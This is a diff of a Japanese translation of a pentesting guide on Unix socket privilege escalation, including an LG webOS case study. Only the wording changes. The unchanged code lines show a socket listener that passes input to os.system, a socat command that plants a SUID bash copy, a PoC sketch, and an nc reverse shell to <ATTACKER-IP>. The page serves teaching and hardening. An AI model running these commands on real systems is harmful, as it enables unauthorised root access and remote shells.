@@ -4,7 +4,7 @@
 
 ## Socket binding example with Python
 
-以下の例では、**unix socket is created**（`/tmp/socket_test.s`）され、すべて**received**されたものが `os.system` によって**executed**されます。現実世界でこのようなコードを見つけることはまずないでしょうが、この例の目的は、unix sockets を使ったコードがどのように見えるか、そして最悪のケースで入力をどのように扱うかを確認することです。
+次の例では、**unix socket が作成されます**（`/tmp/socket_test.s`）そして**受信した**すべてが `os.system` によって**実行されます**。現実の環境でこれを見つけることはないとわかっていますが、この例の目的は unix sockets を使うコードがどのように見えるか、そして最悪のケースで入力をどのように扱うかを確認することです。
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**実行する** その code を python で: `python s.py` と **ソケットがどのようにリッスンしているか確認する**:
+**実行** そのコードを python で実行する: `python s.py` と **socket がどのように待ち受けているかを確認する**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,15 +37,15 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## ケーススタディ: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+## 事例研究: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-一部の特権デーモンは、root-owned UNIX socket を公開しており、信頼できない入力を受け付け、特権アクションを thread-IDs と signals に結び付けます。プロトコルが非特権クライアントにどの native thread を対象にするか影響させる余地を与える場合、特権コードパスをトリガーして権限昇格できる可能性があります。
+一部の privileged daemons は、untrusted input を受け付け、privileged actions を thread-IDs と signals に結びつける root-owned UNIX socket を公開しています。protocol が unprivileged client によってどの native thread がターゲットになるかを左右できる場合、privileged code path を trigger して escalate できる可能性があります。
 
 観察されたパターン:
-- root-owned socket に接続する（例: /tmp/remotelogger）。
-- スレッドを作成し、その native thread id (TID) を取得する。
-- TID（packed）と padding をリクエストとして送信し、確認応答を受け取る。
-- その TID に特定の signal を送って特権動作をトリガーする。
+- root-owned socket（例: /tmp/remotelogger）に接続する。
+- thread を作成し、その native thread id (TID) を取得する。
+- TID（packed）と padding をリクエストとして送信し、acknowledgement を受け取る。
+- その TID に特定の signal を送って privileged behaviour を trigger する。
 
 最小限の PoC スケッチ:
 ```python
@@ -64,9 +64,9 @@ os.kill(tid, 4)  # deliver SIGILL (example from the case)
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-注意:
-- この種のバグは、特権のないクライアント状態（TIDs）から導出された値を信用し、それらを特権付きのシグナルハンドラやロジックに結びつけることから発生します。
-- socket 上で資格情報を強制し、message formats を検証し、特権操作を外部から供給された thread identifiers から切り離すことでハードニングしてください。
+ノート:
+- このクラスのバグは、非特権クライアント状態（TIDs）から派生した値を信用し、それらを特権のシグナルハンドラやロジックに結びつけることから生じます。
+- socket 上で認証情報を強制し、メッセージ形式を検証し、特権操作を外部から提供されたスレッド識別子から切り離すことで強化します。
 
 ## 参考文献
 
